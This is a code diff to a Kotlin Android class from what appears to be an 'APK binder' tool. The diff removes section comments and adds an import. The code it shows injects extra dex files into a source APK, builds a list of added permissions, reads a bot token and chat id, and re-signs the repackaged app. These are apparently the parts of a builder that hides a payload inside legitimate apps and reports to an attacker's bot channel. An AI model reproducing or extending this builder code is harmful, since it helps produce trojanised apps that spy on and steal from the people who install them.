@@ -2,6 +2,7 @@ package Com.devhs.apkbinder.binder
 
 import android.content.Context
 import com.android.apksig.ApkSigner
+import Com.devhs.apkbinder.Const
 import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.withContext
 import java.io.File
@@ -30,9 +31,6 @@ class BinderEngine(private val context: Context) {
         private const val DEX_PATTERN = "classes(\\d*)\\.dex"
     }
 
-    // ------------------------------------------------------------------
-    // Public entry
-    // ------------------------------------------------------------------
     suspend fun bind(
         sourceApk: File,
         outApk: File,
@@ -126,7 +124,6 @@ class BinderEngine(private val context: Context) {
                 }
             }
 
-            // ---- Sign ----
             onLog("[INFO] Signing...")
             val signed = File(outApk.parentFile, outApk.nameWithoutExtension + ".signed.apk")
             if (signed.exists()) signed.delete()
@@ -144,7 +141,6 @@ class BinderEngine(private val context: Context) {
                 signed.delete()
             }
 
-            // ---- Verify ----
             val check = pm.getPackageArchiveInfo(outApk.absolutePath, 0)
             if (check == null) {
                 onLog("[ERROR] Verification failed: APK unreadable")
@@ -166,9 +162,6 @@ class BinderEngine(private val context: Context) {
         }
     }
 
-    // ------------------------------------------------------------------
-    // Config (bot token / chat id)
-    // ------------------------------------------------------------------
     private fun readConfig(): Pair<String, String> {
         val p = context.getSharedPreferences("hs_prefs", Context.MODE_PRIVATE)
         var t = p.getString(Const.PREF_BOT_TOKEN, "") ?: ""
@@ -190,9 +183,6 @@ class BinderEngine(private val context: Context) {
         return t to c
     }
 
-    // ------------------------------------------------------------------
-    // Permissions
-    // ------------------------------------------------------------------
     private fun buildPermissions(features: Collection<String>): List<String> {
         val set = LinkedHashSet<String>()
 
@@ -229,9 +219,6 @@ class BinderEngine(private val context: Context) {
         return set.toList()
     }
 
-    // ------------------------------------------------------------------
-    // Zip helpers
-    // ------------------------------------------------------------------
     private fun nextDexName(zip: ZipFile): String {
         var max = 0
         val regex = Regex(DEX_PATTERN)
@@ -307,9 +294,6 @@ class BinderEngine(private val context: Context) {
         override fun close() = out.flush()
     }
 
-    // ------------------------------------------------------------------
-    // Assets / signing
-    // ------------------------------------------------------------------
     private fun readAsset(name: String): ByteArray =
         context.assets.open(name).use { it.readBytes() }
 
